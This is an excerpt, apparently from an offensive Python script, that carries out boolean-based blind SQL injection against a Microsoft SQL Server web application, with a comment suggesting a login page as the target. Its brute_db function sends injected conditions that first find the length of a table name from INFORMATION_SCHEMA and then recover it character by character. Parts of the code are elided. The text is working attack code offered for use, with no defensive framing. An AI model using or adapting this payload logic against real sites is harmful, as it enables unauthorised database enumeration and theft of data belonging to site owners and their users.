...
#   Change the endpoint to wherever the SQLi is ie. /login.aspx
...
def brute_db(ip):
    ...
    for i in range(1, 100):  # Start from 1 to avoid zero-length check
        if send_payload(ip, f"LEN((SELECT TOP 1 table_name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME())) = {i}"):    
            length = i
            break
    ...
    for i in range(1, length + 1):
        for j in range(32, 127):  # ASCII printable characters
            if send_payload(ip, f"SUBSTRING((SELECT TOP 1 table_name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME()),{i},1)='{chr(j)}'"):  
                db_name += chr(j)
